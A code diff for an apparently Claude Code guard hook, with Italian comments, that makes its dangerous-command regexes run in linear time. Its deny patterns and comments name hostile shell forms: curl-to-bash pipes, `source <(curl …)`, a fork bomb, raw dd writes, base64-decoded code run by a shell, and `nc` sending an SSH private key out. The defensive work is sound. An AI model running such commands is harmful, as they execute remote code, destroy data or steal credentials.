@@ -67,7 +67,9 @@ if hasattr(signal, "SIGALRM"):
 
 # --- Blocco duro (exit 2) ---
 # Il comando che scarica: curl e wget ovunque, fetch solo in testa a un segmento.
-_DOWNLOAD = r"(\b(?:curl|wget)\b|(?:^|[;&|(`\n])\s*(?:sudo\s+)?fetch\b)"
+# Dopo il separatore gli spazi senza a capo (#6363): con `\s*` ogni a capo di una fila di a capo ripartiva e correva
+# su tutti quelli dopo. L'ultimo a capo prima di fetch trova lo stesso.
+_DOWNLOAD = r"(\b(?:curl|wget)\b|(?:^|[;&|(`\n])[^\S\n]*(?:sudo\s+)?fetch\b)"
 # La pipe vera fra due stadi (`\|` di un pattern non lo è, `||` nemmeno), con gli stadi in mezzo
 # (`curl x | tee f | bash`) e sudo con le sue opzioni (`sudo -E bash`): review del 7/11/2026, finding 1.
 _PIPE = r"(?<!(?<!\\)\\)\|(?!\|)"
@@ -83,9 +85,18 @@ _STADIO_VIRGOLETTE = r"(?:[^|'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*
 # separatore solo e non due `&`. Con due letture possibili il ritorno all'indietro cresce esponenziale.
 _COMANDO_GRUPPO = r"(?:[^|;&\n'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*"
 _GRUPPO_DOPO_PIPE = r"(?:[({](?:" + _COMANDO_GRUPPO + r"(?:;|&&|&(?!&)|\|\||\n))*\s*)?"
-_FINO_ALLO_STADIO = (r"[^|]*(?:" + _PIPE + _STADIO_VIRGOLETTE + r")*?" + _PIPE + r"&?\s*" + _GRUPPO_DOPO_PIPE +
-                     r"((?:sudo|doas)(?:\s+(?:-[ugChDprtTU]|--(?:user|group|host|prompt|role|type|chdir|"
-                     r"other-user|close-from|command-timeout))(?:\s+|=)[^\s|;&]+|\s+-\S+)*\s+)?")
+# Quello che sta dopo la pipe dell'interprete, fino al suo nome: _pipe_verso lo prova da solo (#6363).
+_DOPO_PIPE = (r"&?\s*" + _GRUPPO_DOPO_PIPE +
+              r"((?:sudo|doas)(?:\s+(?:-[ugChDprtTU]|--(?:user|group|host|prompt|role|type|chdir|"
+              r"other-user|close-from|command-timeout))(?:\s+|=)[^\s|;&]+|\s+-\S+)*\s+)?")
+_FINO_ALLO_STADIO = r"[^|]*(?:" + _PIPE + _STADIO_VIRGOLETTE + r")*?" + _PIPE + _DOPO_PIPE
+_SHELL_DOPO_PIPE = r"(bash|sh|zsh|fish|perl|ruby|node|php|powershell|pwsh)\b"
+_PYTHON_DOPO_PIPE = (
+    r"python3?(?:\.\d+)?(?![\w.])"
+    r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n\"']|2>)))"
+    r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
+    r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)")
+_TUBO_INTERPRETE = r"[^;&\n]*>\(\s*(?:sudo\s+)?(?:bash|sh|zsh|fish|dash|ksh|python3?|perl|ruby|node|php)\b"
 # curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo. Si giudicano su ogni
 # istruzione (forma_comando.istruzioni): `curl -o d.csv url; head d.csv | python3 conta.py` scarica in un'istruzione e
 # legge un file locale nell'altra, e il blocco duro non lascia confermare (finding 10).
@@ -95,7 +106,7 @@ _FINO_ALLO_STADIO = (r"[^|]*(?:" + _PIPE + _STADIO_VIRGOLETTE + r")*?" + _PIPE +
 # resta un solo gruppo che cattura: la regola python sotto conta i gruppi per il \3.
 # `curl u | powershell -` e `| pwsh -c -` eseguono lo script scaricato come `| bash` (HK-5, 10/11/2026).
 DANGEROUS_ISTRUZIONE = [
-    (_DOWNLOAD + _FINO_ALLO_STADIO + r"(bash|sh|zsh|fish|perl|ruby|node|php|powershell|pwsh)\b",
+    (_DOWNLOAD + _FINO_ALLO_STADIO + _SHELL_DOPO_PIPE,
      "pipe di script remoto in un interprete"),
     # 15/9/2026: `curl ... | python3 -c "import json..."` è parsing, non esecuzione
     # dello stdin (14 blocchi in una settimana). Passa solo il codice inline fra
@@ -106,15 +117,60 @@ DANGEROUS_ISTRUZIONE = [
     # forma isolata) e con la versione (`python3.13`).
     # 30/10/2026 (#4109): passa anche `| python3 -m json.tool` con le sue opzioni a fine segmento:
     # formatta il JSON e non esegue niente.
-    (_DOWNLOAD + _FINO_ALLO_STADIO + r"python3?(?:\.\d+)?(?![\w.])"
-     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n\"']|2>)))"
-     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
-     r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)",
+    (_DOWNLOAD + _FINO_ALLO_STADIO + _PYTHON_DOPO_PIPE,
      "pipe di script remoto in un interprete"),
     # `curl u | tee >(sh)`: la process-substitution manda lo script alla shell come una pipe (#5263).
-    (_DOWNLOAD + r"[^;&\n]*>\(\s*(?:sudo\s+)?(?:bash|sh|zsh|fish|dash|ksh|python3?|perl|ruby|node|php)\b",
+    (_DOWNLOAD + _TUBO_INTERPRETE,
      "pipe di script remoto in un interprete"),
 ]
+
+# --- Le regole di DANGEROUS_ISTRUZIONE in tempo lineare (#6363, 22/11/2026) ---
+# re.search riparte da ogni curl e corre fino in fondo: su 90.000 caratteri di `curl ` ripetuto block-dangerous
+# impiegava 83 secondi, e con `curl |` ripetuto ogni curl rileggeva tutti gli stadi dopo di lui. Qui il risultato è
+# lo stesso della regex (banco LG01-LG03 in tests/test_guardie_lineari_2026_11_22.py), con ogni stadio letto una volta.
+_DOWNLOAD_RE = re.compile(_DOWNLOAD, re.IGNORECASE)
+_PIPE_RE = re.compile(_PIPE)
+_STADIO_RE = re.compile(_STADIO_VIRGOLETTE)
+# Il primo gruppo vuoto tiene i numeri dei gruppi della regex intera: la regola python richiama \3.
+_CODE_DOPO_PIPE = {
+    DANGEROUS_ISTRUZIONE[0][0]: re.compile("()" + _PIPE + _DOPO_PIPE + _SHELL_DOPO_PIPE, re.IGNORECASE),
+    DANGEROUS_ISTRUZIONE[1][0]: re.compile("()" + _PIPE + _DOPO_PIPE + _PYTHON_DOPO_PIPE, re.IGNORECASE),
+}
+_TUBO_INTERPRETE_RE = re.compile(DANGEROUS_ISTRUZIONE[2][0], re.IGNORECASE)
+
+
+def _pipe_verso(testo: str, coda) -> bool:
+    """La regex `scarica [^|]* (pipe stadio)*? pipe coda`, letta in avanti. Dopo uno scaricamento la prima `|`
+    deve essere una pipe; da lì gli stadi si leggono con le virgolette intere, e ogni pipe raggiunta si prova
+    con `coda`. Da una pipe gli stadi dopo sono sempre gli stessi, chiunque ci arrivi: una pipe già vista non si
+    rilegge. Due scaricamenti con la stessa prima `|` arrivano agli stessi stadi, e il secondo si salta."""
+    viste, n, prima = set(), len(testo), -1
+    for d in _DOWNLOAD_RE.finditer(testo):
+        if d.end() > prima:
+            prima = testo.find("|", d.end())
+            if prima < 0:
+                return False
+        p = prima
+        while p not in viste:
+            viste.add(p)
+            if not _PIPE_RE.match(testo, p):
+                break
+            if coda.match(testo, p):
+                return True
+            q = _STADIO_RE.match(testo, p + 1).end()
+            if q >= n or testo[q] != "|":
+                break
+            p = q
+    return False
+
+
+def _trova_regola(pattern: str, testo: str) -> bool:
+    """re.search(pattern, testo, re.IGNORECASE), in tempo lineare per le regole di DANGEROUS_ISTRUZIONE."""
+    if pattern in _CODE_DOPO_PIPE:
+        return _pipe_verso(testo, _CODE_DOPO_PIPE[pattern])
+    if pattern == DANGEROUS_ISTRUZIONE[2][0]:
+        return bool(_fc.cerca_dalle_teste(_TUBO_INTERPRETE_RE, _DOWNLOAD_RE, testo, ";&\n"))
+    return bool(re.search(pattern, testo, re.IGNORECASE))
 DANGEROUS = [
     (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
     (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
@@ -124,7 +180,7 @@ DANGEROUS = [
     (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
      "esecuzione via process-substitution di script remoto"),
     # 21/11/2026 (#6259, S5): `source <(curl …)` e `. <(curl …)` eseguono lo script come `bash <(curl …)`.
-    (r"(?:^|[;&|(\n])\s*(?:source|\.)\s+<\(\s*(curl|wget|fetch)\b",
+    (r"(?:^|[;&|(\n])[^\S\n]*(?:source|\.)\s+<\(\s*(curl|wget|fetch)\b",
      "esecuzione via process-substitution di script remoto"),
     (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
      "eval di output di download remoto"),
@@ -286,7 +342,11 @@ def _riserva(regola, scritture="", open_modi="", coda_open=r"[^'\"]*"):
     seguono _MAIUSCOLE."""
     parti = []
     if scritture:
-        parti.append(scritture.format(p=r"[^\s;|&]*?" + _frammenti(regola)))
+        # {p} è la parola del percorso dopo un programma, {r} dopo una redirezione: senza un altro `>` dentro, così
+        # `>(` ripetuto non riparte da ogni `>` fino in fondo alla parola (#6363). Conta l'ultimo `>`, e trova lo stesso.
+        frammento = _frammenti(regola)
+        parti.append(scritture.format(p=r"[^\s;|&]*?" + frammento, r=r"(?:(?!>)[^\s;|&])*?" + frammento,
+                                      f=frammento))
     if open_modi:
         parti.append(r"open\(\s*['\"][^'\"]*" + _frammenti(regola, "open") + coda_open +
                      r"['\"]\s*,\s*['\"][" + open_modi + "]")
@@ -300,14 +360,21 @@ def _riserva(regola, scritture="", open_modi="", coda_open=r"[^'\"]*"):
 # argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
 # scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
 # dd scrive solo su `of=`.
+# Dopo un programma la corsa si ferma dove il programma ricomincia (_corsa, #6363): `tee ` ripetuto ripartiva da ogni
+# tee fino al primo `|`. Conta l'ultimo tee prima del percorso, e trova lo stesso (banco LG06).
+def _corsa(testa: str, classe: str = r"[^|;&]") -> str:
+    return testa + r"(?:(?!" + testa + r")" + classe + r")*"
+
+
 CONFIG_WRITE_RE = _riserva(
     "config",
-    r">>?\s*{p}|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*{p}|\bdd\b[^|;&]*\bof={p}|\bsed\b[^|;&]*-i[^|;&]*{p}",
+    r">>?\s*{r}|" + _corsa(r"\b(?:tee|truncate|touch|chmod|chown)\b") + r"{f}|" +
+    _corsa(r"\bdd\b") + _corsa(r"\bof=", r"[^\s;|&]") + r"{f}|" + _corsa(r"\bsed\b") + _corsa("-i") + r"{f}",
     "wa")
 # CLAUDE.md, in qualunque cartella: via Edit/Write protect_claude_md.py chiede una volta per modifica
 # (l'unlock della sessione le fa passare tutte), qui si copre il vettore shell, che altrimenti lo riscrive
 # senza prompt. Nel testo bastano redirezione e sed -i: cp, tee e gli altri binari li giudica _writes_config.
-CLAUDE_MD_WRITE_RE = _riserva("claude-md", r">>?\s*{p}|" + _SED + r"[^|;&]*-i[^|;&]*{p}")
+CLAUDE_MD_WRITE_RE = _riserva("claude-md", r">>?\s*{r}|" + _corsa(_SED) + _corsa("-i") + r"{f}")
 # open() di python in scrittura su un CLAUDE.md: chiede sempre, prima di CLAUDE_MD_WRITE_RE (1/11/2026).
 # Il nome chiude le virgolette: `CLAUDE.md.bak` non è un CLAUDE.md.
 CLAUDE_MD_OPEN_RE = _riserva("claude-md", open_modi="wax+", coda_open="")
@@ -316,7 +383,7 @@ CLAUDE_MD_OPEN_RE = _riserva("claude-md", open_modi="wax+", coda_open="")
 # Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
 # _writes_config, che sa quale argomento è la destinazione (copiare un hook
 # altrove è una lettura).
-PERSIST_WRITE_RE = _riserva("avvio-automatico", r">>?\s*{p}", "wa")
+PERSIST_WRITE_RE = _riserva("avvio-automatico", r">>?\s*{r}", "wa")
 # Binari che scrivono un file passato come argomento.
 # sponge (moreutils) riscrive il file che riceve come argomento: `jq … f | sponge f` (#5262).
 _WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch sponge".split())
@@ -326,7 +393,7 @@ _WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch sponge".sp
 # in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
 # non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln, anche verso la cartella, e mkdir:
 # _writes_config(_is_unlock, crea=True) (#5261).
-UNLOCK_RE = _riserva("sblocco", r"(?:>>?\s*|\b(?:touch|tee|mkdir)\b[^|;&]*){p}", "wax")
+UNLOCK_RE = _riserva("sblocco", r">>?\s*{r}|" + _corsa(r"\b(?:touch|tee|mkdir)\b") + r"{f}", "wax")
 
 # --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
 # In ~/.ssh/ chiedono le chiavi private e i file sconosciuti. config, known_hosts,
@@ -406,8 +473,9 @@ _ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 _SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
 # `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
 # `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
+# Senza un altro `<` nella parola (#6363): `<(` ripetuto ripartiva da ogni `<` fino in fondo. Conta l'ultimo `<`.
 _SECRET_REDIR_RE = re.compile(
-    r"(?:<\s*|\$\(\s*<\s*)[^\s;|&)]*?"
+    r"(?:<\s*|\$\(\s*<\s*)(?:(?!<)[^\s;|&)])*?"
     r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
     r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
     r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
@@ -524,7 +592,7 @@ def _scarico_innocuo(istruzione: str) -> bool:
         return False
     try:
         mascherato = _maschera_virgolette(istruzione)
-        if not any(re.search(p, mascherato, re.IGNORECASE) for p, _ in DANGEROUS_ISTRUZIONE):
+        if not any(_trova_regola(p, mascherato) for p, _ in DANGEROUS_ISTRUZIONE):
             # la forma sta solo fra virgolette: conta chi riceve quel testo
             programmi = _fc.programmi(istruzione)
             if not programmi:
@@ -813,6 +881,12 @@ _SHELLS = _fc.SHELL
 _SECRET_DIR_RE = re.compile(r"(\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)(?=[\s'\"/*]|$)")
 
 
+# `find <segreto> -exec cat {} \;`. Si prova dal primo find di ogni riga (#6363): `find ` ripetuto 18.000 volte
+# teneva block-dangerous 8 secondi.
+_FIND_EXEC = re.compile(r"\bfind\b(.*?)\s-(?:exec|execdir|ok|okdir)\s+(\S+)", _RE_NOMI)
+_FIND_TESTA = re.compile(r"\bfind\b", _RE_NOMI)
+
+
 def _lettura_indiretta(cmd):
     """Il path segreto e il lettore stanno in comandi diversi, e il controllo per
     segmento non li vede insieme: `find <segreto> | xargs cat`,
@@ -836,7 +910,7 @@ def _lettura_indiretta(cmd):
                     return True
                 if toks[0] == "while" and "read" in toks[1:3]:
                     return True
-        m = re.search(r"\bfind\b(.*?)\s-(?:exec|execdir|ok|okdir)\s+(\S+)", stmt, _RE_NOMI)
+        m = _fc.cerca_dalle_teste(_FIND_EXEC, _FIND_TESTA, stmt)
         if m and segreto(m.group(1)) and _fc._nome(m.group(2)) in (_READ_BINS | _SHELLS):
             return True
     return False
@@ -1792,7 +1866,7 @@ def _scrive_config_inline(command, cwd):
         return False
     codice = codice.replace('\\"', '"')
     basi = [cwd] + [_resolve(m.group(1), cwd) for m in
-                    re.finditer(r"(?:^|[;&|(\n]\s*)(?:cd|pushd)\s+([^\s;&|)]+)", codice)]
+                    re.finditer(r"(?:^|[;&|(\n][^\S\n]*)(?:cd|pushd)\s+([^\s;&|)]+)", codice)]
     variabili = {}
     for riga in re.split(r"[;\n]", codice):
         m = _ASSEGNAZIONE_CODICE.match(riga)
@@ -3082,6 +3156,8 @@ def _rm_segments(command):
     """
     forma = _forma()
     out = []
+    # Se il comando nomina rm si guarda una volta sola (#6363): a ogni programma in una variabile rileggeva il testo.
+    rm_nel_testo = None
     for nome, args, cwd_decl in _programmi_con_cd(command):
         # Windows (review del 7/11/2026, finding 8): rd, rmdir, del ed erase con /s, e dentro cmd /c.
         basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
@@ -3097,7 +3173,9 @@ def _rm_segments(command):
                 out.append((bersagli, cwd_decl))
             continue
         # La barra conta come inizio del nome: `R=/bin/rm; $R -rf x` passava (20/11/2026).
-        if nome.startswith("$") and re.search(r"(?:^|[\s'\"=;&|(/])(?:rm|unlink|shred)(?:[\s'\";&|)]|$)", command, _RE_NOMI):
+        if nome.startswith("$") and rm_nel_testo is None:
+            rm_nel_testo = bool(re.search(r"(?:^|[\s'\"=;&|(/])(?:rm|unlink|shred)(?:[\s'\";&|)]|$)", command, _RE_NOMI))
+        if nome.startswith("$") and rm_nel_testo:
             if _variabile_innocua(nome, command):
                 continue  # `C=~/.local/bin/claude; $C rm <id>`: il programma è claude, non rm (20/11/2026)
             out.append((None, cwd_decl))  # `RM='rm -rf'; $RM x`: il programma è una variabile (finding 2)
@@ -3350,9 +3428,59 @@ _DECODIFICA = (r"(?:\b(?:base64|gbase64)\b[^|;&\n]*?(?:\s-[a-zA-Z]*[dD]\b|\s--de
 _SHELL_CHE_ESEGUE = r"(?:\S*/)?(?:bash|sh|zsh|dash|ksh|fish)\b|(?:\S*/)?(?:python3?|perl|ruby|node|php)\s*(?:-\s*)?(?:$|[;&|)\n])"
 _CODICE_NASCOSTO = re.compile(
     _DECODIFICA + r"[^|;&\n]*(?:\|[^|;&\n]*)*?\|\s*(?:(?:sudo|doas)\s+)?(?:" + _SHELL_CHE_ESEGUE + r")|"
-    r"(?:\beval\b|\b(?:bash|sh|zsh|dash|ksh)\s+-[a-zA-Z]*c\b|(?:^|[;&|(\n])\s*(?:source|\.)\s)[^\n;&|]*"
+    r"(?:\beval\b|\b(?:bash|sh|zsh|dash|ksh)\s+-[a-zA-Z]*c\b|(?:^|[;&|(\n])[^\S\n]*(?:source|\.)\s)[^\n;&|]*"
     r"(?:\$\(|`|<\()[^()`]*" + _DECODIFICA + "|"
     r"\b(?:bash|sh|zsh|dash|ksh)\s+<\([^()]*" + _DECODIFICA, _RE_NOMI)
+# La prima forma (`base64 -d … | sh`) letta in avanti (#6363, 22/11/2026): `base64 -d ` ripetuto teneva la regex 19
+# secondi su 8.000 caratteri, perché ogni base64 riprovava ogni -d dopo di lui e ogni stadio della pipe. Banco LG06.
+_DECODIFICA_TESTE = [
+    (re.compile(r"\b(?:base64|gbase64)\b", _RE_NOMI), re.compile(r"[^|;&\n]*?(?:\s-[a-zA-Z]*[dD]\b|\s--decode\b)", _RE_NOMI)),
+    (re.compile(r"\bxxd\b", _RE_NOMI), re.compile(r"[^|;&\n]*?\s-[a-zA-Z]*r\b", _RE_NOMI)),
+    (re.compile(r"\bopenssl\s+(?:enc|base64)\b", _RE_NOMI), re.compile(r"[^|;&\n]*?\s-d\b", _RE_NOMI)),
+]
+_CONFINE_STADIO = re.compile(r"[|;&\n]")
+_PIPE_IN_SHELL = re.compile(r"\|\s*(?:(?:sudo|doas)\s+)?(?:" + _SHELL_CHE_ESEGUE + r")", _RE_NOMI)
+_CODICE_NASCOSTO_ALTRO = re.compile(
+    r"(?:\beval\b|\b(?:bash|sh|zsh|dash|ksh)\s+-[a-zA-Z]*c\b|(?:^|[;&|(\n])[^\S\n]*(?:source|\.)\s)[^\n;&|]*"
+    r"(?:\$\(|`|<\()[^()`]*" + _DECODIFICA + "|"
+    r"\b(?:bash|sh|zsh|dash|ksh)\s+<\([^()]*" + _DECODIFICA, _RE_NOMI)
+
+
+def _decodifica_in_shell(t: str) -> bool:
+    """La prima forma di _CODICE_NASCOSTO: una decodifica, poi `|` e gli stadi fino a una pipe verso una shell.
+    Di una testa conta la prima del suo tratto senza `|;&` e a capo: le altre arrivano agli stessi -d. Da una
+    decodifica la catena degli stadi è una sola, e una catena già percorsa non si rilegge."""
+    fini = []
+    for testa, opzione in _DECODIFICA_TESTE:
+        # confine: dopo una testa senza opzione, il resto del suo tratto non ne ha. fatto: le teste prima
+        # dell'opzione trovata arrivano alla stessa opzione.
+        confine = fatto = -1
+        for h in testa.finditer(t):
+            if h.end() <= confine or h.end() <= fatto:
+                continue
+            m = opzione.match(t, h.end())
+            if m:
+                fini.append(m.end())
+                fatto = m.end()
+            else:
+                c = _CONFINE_STADIO.search(t, h.end())
+                confine = c.start() if c else len(t)
+    coperto = -1
+    for e in sorted(fini):
+        if e <= coperto:
+            continue
+        c = _CONFINE_STADIO.search(t, e)
+        while c and c.group(0) == "|":
+            if _PIPE_IN_SHELL.match(t, c.start()):
+                return True
+            c = _CONFINE_STADIO.search(t, c.end())
+        coperto = c.start() if c else len(t)
+    return False
+
+
+def _codice_nascosto(t: str) -> bool:
+    """_CODICE_NASCOSTO.search(t), con la prima forma letta da _decodifica_in_shell."""
+    return _decodifica_in_shell(t) or bool(_CODICE_NASCOSTO_ALTRO.search(t))
 
 
 # S6: find che cerca i nomi delle chiavi e li passa a un lettore.
@@ -3871,7 +3999,7 @@ def main() -> int:
         except Exception:
             pass
         for pattern, why, testi in regole:
-            if any(re.search(pattern, t, re.IGNORECASE) and
+            if any(_trova_regola(pattern, t) and
                    not ((pattern, why) in DANGEROUS_ISTRUZIONE and _scarico_innocuo(t)) for t in testi):
                 sys.stderr.write(
                     f"Bloccato: questo comando sembra {why}. "
@@ -3981,9 +4109,9 @@ def main() -> int:
             "scaricare, leggere il file e poi eseguirlo. Conferma solo se la fonte è fidata."
         )
     try:
-        nascosto = any(_CODICE_NASCOSTO.search(i) for i in _fc.istruzioni(_fc.togli_commenti(testo)))
+        nascosto = any(_codice_nascosto(i) for i in _fc.istruzioni(_fc.togli_commenti(testo)))
     except Exception:
-        nascosto = bool(_CODICE_NASCOSTO.search(testo))
+        nascosto = _codice_nascosto(testo)
     if nascosto:
         return _ask("codice-nascosto",
             "Il comando decodifica un testo (base64, xxd, openssl) e lo passa a una shell: il codice che gira non "
